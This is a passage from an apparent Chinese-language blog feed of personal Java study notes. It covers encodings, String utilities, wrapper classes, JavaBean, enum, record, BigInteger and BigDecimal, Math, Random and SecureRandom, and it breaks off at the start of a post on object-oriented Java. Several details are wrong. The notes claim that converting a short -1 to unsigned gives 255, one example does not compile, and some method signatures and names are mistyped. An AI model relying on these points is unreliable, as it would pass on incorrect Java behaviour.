<p>但是后来有其他的非英语系国家为了使用自己国家语言文字的计算机，开始开发自己国家的字符编码，比如中国汉字的编码 <code>GB2312-80</code> 和 <code>GBK</code> 。但是对于网上传输其他国家的文字，因为使用的文字编码不同，会导致无法解析，比如韩国电脑解析不出来 GBK 编码的文字，打开直接乱码。</p>
<p>为了统一编码方式，将所有的文字都制定一个标准，让所有人都能解析所有文字，于是 Unicode 就诞生了，这是一个立志于编写所有文字的标准。</p>
<p>在创造 Java 的时候，当时创造者认为两个字节的 Unicode 就可以容纳世界上所有的主流文字了，所以就给 Java 的 char 类型设置了两字节的空间，并使用 Unicode 作为 char 类型的编码方式。由于像汉字这样的表意文字大量加入 Unicode 家族，导致了 Unicode 的大小不断膨胀，一度到了四个字节的大小。</p>
<p>这时候英语系国家的人就不乐意了，因为他们的大量内容都是使用 ASCII 作为编码的，他们不但需要改变自己的编码方式，还要白白的多使用三个字节的空间来存储一个字符，于是基于 Unicode 字符集的编码方式： UTF-8 就诞生了。</p>
<p>UTF-8 的最大特性就是可变字符长度，对于 ASCII 的字符，编码方式和 ASCII 相同，都只占用一个字节的空间。这样就不但不需要改变原来使用 ASCII 编码的信息，还符合和其他文字一起用的标准，并且能节省大量的空间。由于这些优良的特性，使得 UTF-8 编码快速成为了互联网上最流行的文字编码形式。</p>
<h3 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h3><p>对于和 String 类有关的类型转换只有两种，一种是从其他类型按照长得样子转化为 String 类型，另外一种则是将 String 字符按照长的样子转化为所属于的类型。</p>
<ol>
<li>对于其他类型转化为 String 类型，则使用 String 类的静态方法  <code>valueOf();</code>  这是一个重载方法，尽管输入不同的类型就是了。比如 <code>String.valueOf(3.14);</code> 会返回一个字符串 <code>&quot;3.14&quot;</code> 。</li>
<li>对于 String 类型转化为其他类型，则需要使用要转化为类型所对应的类的静态方法，比如将字符串 “3.14” 转化为 double 类型的数据，则需要 Java 自带的类 Double，里面有一个方法 <code>parseDouble()</code> 可以将接受的字符串转化为字面的 double 类型的数据。需要注意的是，如果输入的字符串对于需要转换的数据类型来说不合法，那么就会报错。基本数据类型对应的类一般都是首字母大写的全称。</li>
<li>还有一种比较特殊的类型转换，那就是将 String 类型转化为字节类，使用的是 String 类的方法：<code>.getBytes()</code> ，会返回一个字节数组，里面的数组是 String 类里面的字符使用 Unicode 编码的存储。</li>
</ol>
<h2 id="StringBuilder"><a href="#StringBuilder" class="headerlink" title="StringBuilder"></a>StringBuilder</h2><p>String 类可以使用 <code>+</code> 来将两个字符串进行拼接，对于常量的字符串来说，<code>&quot;Xorex&quot;+&quot;Tempest&quot;</code> 会被在编译的时候直接变成常量 <code>&quot;XorexTempest&quot;</code> ，速度会很快。但是对于非常量的字符来说，每一次使用 <code>+</code> 来运算 String 类的时候，就会经历创建新的字符串，扔掉旧的字符串这个过程。这不但会占用大量的内存，还会影响 Java GC（Garbage Collection）的效率。于是 Java 中就引入了全新的可变字符长度的类 StringBuilder 和 StringBuffer 。两者几乎相同同，唯一的不同是 StringBuffer 是线程安全的，因此效率要低一点。</p>
<p>StringBuilder 类的初始化，也就是构造方法有三种，一种是接受 String 作为初始化数据，一种是接受 CharSequence 作为初始化数据（CharSequence 不太了解就不管了），最后就是接受一个整形作为初始化容器的大小（默认大小是16）。</p>
<p>StringBuilder 里面有很多对字符串进行操作的方法，比如在字符串后面附加字符串 <code>.append(String str);</code> ，在指定位置插入字符串 <code>.insert(int Pos,String str);</code>，在进行大量的字符串操作中，因为使用的是可变的字符串，所以性能会快上很多。由于内置的所有操作方法都会返回实例本身 <code>this</code>，也就是说可以进行链式操作，将需要的一套操作接在后面即可。</p>
<p>如果预测或者花较小的代价知道需要操作的字符串最大的长度是多少，这个速度还能更快，因为这个类的默认容器大小是16，如果不够用，会重新创建一个两倍原来大小的容器来存放字符串。如果操作字符很大，那么就会有 log(n) 次容器的销毁和创建，如果在初始化的时候直接输入一个合适的大小，那么容器销毁和创建次数就会大大减少，从而提高性能。</p>
<h2 id="StringJoiner"><a href="#StringJoiner" class="headerlink" title="StringJoiner"></a>StringJoiner</h2><p>故名思意，这个类就是用来连接 String 类的，专门用来处理用分隔符拼接数组，首先需要给构造函数一个分隔符，<code>new StringJoiner(String SplitSignal)</code>，当然也可以在添加分隔符的同时指定开头和结尾，只需要在 SplitSignal 后面依次加上两个字符串就可以了，比如：<code>new StringJoiner(String SplitSignal,String StartSignal,String EndSignal);</code></p>
<p>String 类提供了一个静态方法 <code>String.join(String SplitSignal,String[] StringArr)</code> ，这个静态方法会返回一个用分隔符来拼接的数组。</p>
<h2 id="包装类型"><a href="#包装类型" class="headerlink" title="包装类型"></a>包装类型</h2><p>一般来说，引用类型是一个类，而基本类型则不是，但是我们也可以把 Java 的基本类型包装成引用类型。在 Java 的库里面，真的将基本数据类型都打包了一个类。</p>
<table>
<thead>
<tr>
<th align="left">基本类型</th>
<th align="left">对应的引用类型</th>
</tr>
</thead>
<tbody><tr>
<td align="left">boolean</td>
<td align="left">java.lang.Boolean</td>
</tr>
<tr>
<td align="left">byte</td>
<td align="left">java.lang.Byte</td>
</tr>
<tr>
<td align="left">short</td>
<td align="left">java.lang.Short</td>
</tr>
<tr>
<td align="left">int</td>
<td align="left">java.lang.Integer</td>
</tr>
<tr>
<td align="left">long</td>
<td align="left">java.lang.Long</td>
</tr>
<tr>
<td align="left">float</td>
<td align="left">java.lang.Float</td>
</tr>
<tr>
<td align="left">double</td>
<td align="left">java.lang.Double</td>
</tr>
<tr>
<td align="left">char</td>
<td align="left">java.lang.Character</td>
</tr>
</tbody></table>
<h3 id="装箱与拆箱"><a href="#装箱与拆箱" class="headerlink" title="装箱与拆箱"></a>装箱与拆箱</h3><p>这些类里面都定义了很多方法来供我们使用，而且编译器还对这些方法进行了优化，比如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Integer n=<span class="number">1</span>; <span class="comment">// Integer n=Integer.valueOf(1);</span></span><br><span class="line"><span class="keyword">int</span> m=n; <span class="comment">// int m=n.intValue();</span></span><br></pre></td></tr></table></figure>
<p>上面的代码会被编译器自动优化成注释后面的代码，这被称为自动装箱和自动拆箱。</p>
<p>因为是个类，所以不可以使用 <code>==</code> 来判断是否相等，需要使用 equals() 来比较判断。</p>
<h3 id="工厂方法"><a href="#工厂方法" class="headerlink" title="工厂方法"></a>工厂方法</h3><p>观察上面的代码，Integer.valueOf() 返回的是一个对象，也就是说，这个方法可以创建对象，我们把能够创建一个新的对象的 <strong>静态方法</strong> 称为工厂方法。查看 Integer.valueOf() 的源代码就可以发现，当输入的参数在一个特定的范围里面的时候，就会使用缓存技术来提高性能。当然这样我们就不需要考虑创建对象的具体细节，将这些任务交给工厂方法就可以了。</p>
<h3 id="包装其他的方法"><a href="#包装其他的方法" class="headerlink" title="包装其他的方法"></a>包装其他的方法</h3><p>像 Integer 类里面还包含有很多用于进制转换的方法，比较好用的比如 <code>Integer.toString(int i,int cimal)</code>  然后这个方法就会返回将数字 i 转化为对应 cimal 进制的字符串。</p>
<p><code>Integer.parseInt(String Num)</code> 则是会将一个长得像整形数字的字符串转化为一个整形并返回。如果再添加一个整形的进制参数，可以按照指定的进制进行解析字符串所表示的字符。</p>
<h3 id="处理无符号整形"><a href="#处理无符号整形" class="headerlink" title="处理无符号整形"></a>处理无符号整形</h3><p>虽然 CPU 支持无符号整形，但是 Java 并没有提供这些。于是基本数据类型的包装方法加入了可以转化无符号数为有符号数的方法。</p>
<p>转化的方法就是按照当前数据的二进制补码看作无符号整形的编码来解析，比如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">short</span> n=-<span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> m=Short.toUnsignedint(n);</span><br></pre></td></tr></table></figure>
<p>结果这个 m 的值是 255，因为 -1 在计算机里的存储是  <code>11111111</code> ，那么按照无符号来进行解析的话，它就是十进制的 <code>255</code> 。因为这个表示范围肯定超过了有符号数的范围，所以进行无符号转化的时候，必须转化为更大范围的基本数据，比如 Short 只有 <code>toUnsignedInt()</code> 和 <code>toUnsignedLong()</code> 两个方法，Long 的无符号转化就只能转化为 String 类型。</p>
<h2 id="JavaBean"><a href="#JavaBean" class="headerlink" title="JavaBean"></a>JavaBean</h2><p>JavaBean 的内容和 JavaBean 这个名称没有任何的关系，JavaBean 其实指的是一种设计模式，就是将类中的非方法字段，全部设置成 private ，对于外界想要改变和获取的非方法字段，单独设置 public 方法 getter() 和 setter() 来对这些非方法字段进行修改和读取。</p>
<p>为什么要这样干？ 其实这是为了保证程序的兼容性，有些非方法字段如果随意开放，一旦在后期的程序迭代中改变了这个非方法字段，那么以前的程序就有运行的问题。所以保留一个 getter() 和 setter() 方法，这样只需要修改这两个方法里面的代码就可以解决兼容性的问题。</p>
<p>举个例子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Tempest Xorex;</span><br><span class="line">        Xorex.setHight(<span class="number">178</span>);</span><br><span class="line">        Xorex.setWeight(<span class="number">100</span>);</span><br><span class="line">        System.out.println(Xorex.getHight());</span><br><span class="line">        System.out.println(Xorex.getWeight());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tempest</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> hight;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> weight;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setHight</span><span class="params">(<span class="keyword">int</span> hight)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.hight=hight;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setWeight</span><span class="params">(<span class="keyword">int</span> weight)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.weight=weight;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getHight</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.hight;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getWeight</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.weight;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面的代码通过一组 set/get 方法将私有字段与外界联系起来，这样的一组方法和字段被称为类的一个属性。比如上面的代码 Tempest 类就设置了两个属性 hight 和 weight ，一定要记得属性是由三个字段组成，set 方法，get 方法和数据。</p>
<h2 id="枚举类-enum"><a href="#枚举类-enum" class="headerlink" title="枚举类 enum"></a>枚举类 enum</h2><p>enum -&gt; enumeration [ɪˌnjuːməˈreɪʃn] 枚举</p>
<p>enum 是一个特殊的标识符，表示将一个类声明为枚举类，枚举类是一系列常量元素的集合。这里的枚举要实现的目标就是一个常量集合，比如月份，星期这些。有的时候我们需要处理这些需要被枚举的常量的时候，一个枚举类的构造会大大规范我们代码的统一性。</p>
<p>而一个枚举类的定义也很简单，直接用 enum + 类名 即可：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">Week</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    Mon,Tue,Wed,Thu,Fri,Sat,Sun;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面的代码在编译的时候，会被自动转化为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Week</span> <span class="keyword">extends</span> <span class="title">Enum</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Week Mon=<span class="keyword">new</span> Week();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Week Tue=<span class="keyword">new</span> Week();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Week Wed=<span class="keyword">new</span> Week();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Week Thu=<span class="keyword">new</span> Week();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Week Fri=<span class="keyword">new</span> Week();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Week Sat=<span class="keyword">new</span> Week();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Week Sun=<span class="keyword">new</span> Week();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为枚举类是继承于 Enum 类，所以 Enum 类里面的很多很好玩的方法就可以使用了。</p>
<p>name() 不可重写方法，返回常量名。</p>
<p>toString() 可重写方法，默认返回常量名。</p>
<p>ordinal() 返回常量的顺序。</p>
<p>values() 静态方法，返回一个包含所有常量的数组。</p>
<p>下面一般是比较常用的 enum 枚举类的使用方式。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(Week i : Week.values())</span><br><span class="line">        System.out.println(i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">Week</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    Mon(<span class="string">&quot;Monday&quot;</span>),</span><br><span class="line">    Tue(<span class="string">&quot;Tuesday&quot;</span>),</span><br><span class="line">    Wed(<span class="string">&quot;Wednesday&quot;</span>),</span><br><span class="line">    Thu(<span class="string">&quot;Thursday&quot;</span>),</span><br><span class="line">    Fri(<span class="string">&quot;Friday&quot;</span>),</span><br><span class="line">    Sat(<span class="string">&quot;Saturday&quot;</span>),</span><br><span class="line">    Sun(<span class="string">&quot;Sunday&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String value;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Week</span><span class="params">(String value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.value=value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="记录类-record"><a href="#记录类-record" class="headerlink" title="记录类 record"></a>记录类 record</h2><p>上面提到了枚举类 enum，用一个简单的语法来代替常用的设置类情形。同样的，在写代码的时候，会出现想要写一个类来专门保存一组不变的数据，对于拥有这种统一格式的数据，有一种专门的类叫作 record 记录类 来将这些数据记录下来。</p>
<p>record 的语法和 enum 很像：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">record</span> <span class="title">Point</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;&#125;;</span><br></pre></td></tr></table></figure>
<p>这样就可以声明一个叫作 Point 的纪录类了，编译器会自动把这些代码都补全：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Point</span> <span class="keyword">extends</span> <span class="title">Record</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> x;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> y;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Point</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.x = x;</span><br><span class="line">        <span class="keyword">this</span>.y = y;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">x</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">y</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.y;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;Point[x=%s, y=%s]&quot;</span>, x, y);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样和 enum 一样，用了极少的代码完成了这些任务，语法糖真甜。</p>
<p>除了使用最基本的语法糖，我们当然可以在里面添加一些自定义的功能，比如补充构造方法，添加静态方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">record</span> <span class="title">Point</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> Point &#123;</span><br><span class="line">        <span class="keyword">if</span>(x&gt;y) <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Out</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Point&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果想要添加普通的方法，那为什么不试试功能更加全面的普通类呢？这个 record 语法糖是在 Java 14  才更新的，而且还是 preview 功能，大概还没有多少人用过这个东西吧。</p>
<h2 id="高精度-BigInteger"><a href="#高精度-BigInteger" class="headerlink" title="高精度 BigInteger"></a>高精度 BigInteger</h2><p>对于处理超过 long 表示的整数的时候，Java 贴心的准备了 BigInteger 类来处理这些内容，其内部是使用 final int[] 来实现的高精度，使用之前导入 java.math.BigInteger 类。</p>
<ul>
<li><p>add() 两个实例之间相加。</p>
</li>
<li><p>subtract() 两个实例之间相减。</p>
</li>
<li><p>multiply() 两个实例之间相乘。</p>
</li>
<li><p>divide() 两个实例之间相除。</p>
</li>
<li><p>pow(int x) 将实例的 x 幂。</p>
</li>
</ul>
<p>当然这里面还包括将 BigInteger 转化为基本数据类型的方法：</p>
<ul>
<li>转换为 byte：byteValue()</li>
<li>转换为 short：shortValue()</li>
<li>转换为 int：intValue()</li>
<li>转换为 long：longValue()</li>
<li>转换为 float：floatValue()</li>
<li>转换为 double：doubleValue()</li>
</ul>
<h2 id="高精度-BigDecimal"><a href="#高精度-BigDecimal" class="headerlink" title="高精度 BigDecimal"></a>高精度 BigDecimal</h2><p>不同于 Integer 这个 Decimal 表示的是浮点数，也就是高精度的浮点数，它可以保留任意精度。BigDecimal 里面有一些不太一样的方法，用来解决对于浮点数的一些需求。</p>
<ul>
<li>scale() 返回 BigDecimal 实例的小数位数。</li>
<li>stripTrailingZeros() 字面意思 strip 脱去，Trail 末尾，即去掉末尾的零。</li>
<li>n.divideAndReminder(m) 让 n 除以 m 并且返回商和余数。返回类型为 BigDecimal[]，里面有两个元素，第一个是商，第二个是余数。</li>
</ul>
<p>将两个 BigDecimal 数据进行比对的时候，尽量不要使用 equals() 而是要使用 compareTo()，对于 equals() 比对的时候比较严格，需要两个BigDecimal 数据不仅数值上相等，还要求两者的 scale() 值也相等。但是 compareTo() 只要求前者相等即为相等。</p>
<p>compareTo() 会返回正数负数和零，分别表示大于小于和等于。</p>
<h2 id="工具类"><a href="#工具类" class="headerlink" title="工具类"></a>工具类</h2><h3 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h3><p>数学工具人，里面含有各种静态的工具方法，下面大致说一下比较常用的，不常用的用到了再说。</p>
<ul>
<li>计算绝对值 Math.abs(Num)</li>
<li>计算最大值/最小值 Math.max(Num) / Math.min(Num)</li>
<li>计算 x 的 y 次方 Math.pow(x,y)</li>
<li>计算开方 Math.sqrt(x)</li>
<li>计算 e 的 x 次方 Math.exp(x)</li>
<li>计算以 e 为底的对数  Math.log(x)</li>
<li>计算以10 为底的对数 Math.log10(x)</li>
<li>计算三角函数 Math.sin(x) / cos(x) / tan(x) …</li>
<li>常量 Math.PI / Math.E （double 常量，非高精）</li>
<li>随机数 Math.random() 返回一个 double 的随机数。</li>
</ul>
<h3 id="Random"><a href="#Random" class="headerlink" title="Random"></a>Random</h3><p>一个专门生成伪随机数的一个类，可以创建实例的时候给 Random 构造函数一个种子，也可以不给，如果不给的话，每次在创建实例的时候，会把当前的时间戳作为种子，所以看起来就不是一个伪随机数了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Random random=<span class="keyword">new</span> Random(); <span class="comment">//创建一个 Random 的实例，此时 random 的种子已确定。</span></span><br><span class="line">System.out.println(random.nextInt()); <span class="comment">//Int范围内一个随机整数</span></span><br><span class="line">System.out.println(random.nextDouble()); <span class="comment">// 0-1 范围内返回内一个随机浮点数</span></span><br><span class="line">System.out.println(random.nextInt(<span class="number">100</span>)); <span class="comment">// 0-100 范围内返回一个随机整数 </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="SecureRandom"><a href="#SecureRandom" class="headerlink" title="SecureRandom"></a>SecureRandom</h3><p>真正的随机数我们是没有办法通过计算机获得的，但是我们只需要一个安全的随机数即可，所谓安全就是这个随机数不可被预测，而这个安全性的保障是通过随机事件所产生的 熵 来实现的。随机事件比如 CPU 的热噪声，读取磁盘的字节，网络流量等等。</p>
<p>正是因为 SecureRandom 的安全性实现是依靠不可被预测的随机熵实现的，所以它无法被设置种子。SecureRandom 有不同的底层实现方法，因为设备的不同使的支持的实现方法也不同，所以我们应该优先调用安全强度更高的安全算法，如果设备不提供的话，再使用普通的安全算法。</p>
<p>那么使用 try-catch 语句来尝试这个过程：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"><span class="keyword">import</span> java.security.SecureRandom;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SecureRandom SR=<span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            SR=SecureRandom.getInstanceStrong();</span><br><span class="line">            System.out.println(<span class="string">&quot;Seccess!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException e) &#123;</span><br><span class="line">            SR=<span class="keyword">new</span> SecureRandom();</span><br><span class="line">            System.out.println(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(SR.nextInt());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面的代码执行过程就是，尝试调用 SecureRandom 类中的静态方法 getInstanceStrong() 来获得更高安全性的随机算法。如果设备不支持，那么就使用普通的随机算法。</p>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><blockquote>
<p>拖延了一个多星期的核心类学习笔记终于完成了，这一遍地学习更多地是留下一个印象，知道有这些用法，以后肯定会对里面内在的原理之类进行研究的。下一个目标，在年前完成异常处理的学习吧！</p>
</blockquote>
]]></content>
      <categories>
        <category>开发知识</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>笔记</tag>
        <tag>核心类</tag>
      </tags>
  </entry>
  <entry>
    <title>Java面向对象学习笔记</title>
    <url>/2020/12/24/c1b945298bef/</url>
    <content><![CDATA[<h2 id="类中的方法"><a href="#类中的方法" class="headerlink" title="类中的方法"></a>类中的方法</h2><h3 id="在方法中使用变量和属性"><a href="#在方法中使用变量和属性" class="headerlink" title="在方法中使用变量和属性"></a>在方法中使用变量和属性</h3><p>在 Java 类中的方法中，我们可以直接声明各种变量使用，但是如果需要使用这个类中的属性的时候，有两种方法可以调用这个属性。一种是使用 <code>this.field</code> 这个this 始终指向当前实例。另外一种就是比较简单的，如果<strong>不存在属性和变量名冲突</strong>的情况下，可以直接像调用变量一样调用这个类的属性（局部变量的优先级大于类属性）</p>
<h3 id="方法也想要可变参数"><a href="#方法也想要可变参数" class="headerlink" title="方法也想要可变参数"></a>方法也想要可变参数</h3><p>一个类的方法可以设置输入的参数，调用的时候就严格的按照设置的参数进行输入就可以了，但是如果不确定调用方法的时候要输入的参数的时候该怎么办呢？这里就要说到可变参数了。</p>
<p>可变参数的设置方法就是 <code>Type... variable</code> 然后调用这个方法的时候，可以传入任意数量的参数，Java会把这些参数整合成为对应类型的数组。需要注意的是，这个可变参数必须在所有参数的最后面，否则就会报错。</p>
<p>下面就是两种实现可变参数传入的方法，第一种是传进去之后Java整合成数组，第二种是构造好一个数组之后再传进去。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Tempest</span><span class="params">(<span class="keyword">int</span> Num,String... names)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(String name:names)</span><br><span class="line">        System.out.println(name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Xorex</span><span class="params">(String[] names)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(String name:names) </span><br><span class="line">        System.out.println(name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        String[] names=&#123;<span class="string">&quot;Tempest&quot;</span>,<span class="string">&quot;Xorex&quot;</span>&#125;;</span><br><span class="line">        Xorex(names);</span><br><span class="line">        Tempest(<span class="number">2</span>,<span class="string">&quot;Xorex&quot;</span>,<span class="string">&quot;Tempest&quot;</span>);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="实参是怎样传进去的"><a href="#实参是怎样传进去的" class="headerlink" title="实参是怎样传进去的"></a>实参是怎样传进去的</h3><p>对于传入的基本类型的变量，是通过复制传入的，也就是说调用方法传入参数的时候，实际上传入的是一个数据，无论这个数据被形参接收之后经过怎样的更改，也影响不到实参。这点和C语言是一样的。</p>
<p>对于传入的是引用类型的呢，传入的其实是引用的坐标，如果方法内部的形参更改了其应用的数据，外部的实参同样引用的是这个数据，所以就会发生更改。这里就想C语言的指针一样，传进去的是地址。</p>
<h3 id="方法签名"><a href="#方法签名" class="headerlink" title="方法签名"></a>方法签名</h3><p>那么Java是如何识别一个特别的方法呢？其实是通过方法签名实现的，所谓方法签名，其实就是 方法名称以及方法形参 的集合，如果两个方法签名相同，也就是方法名称和方法形参都相同，那么这就是一个方法，否则就是两个不同的方法。</p>
<h2 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h2><p>为了实现在创建一个实例的时候，对类中的属性进行初始化，所以Java有自己的构造方法，作用和PHP的 <code>__construct()</code> 魔术方法相同，但是细节不太一样。</p>
<p>构造方法的格式是：</p>
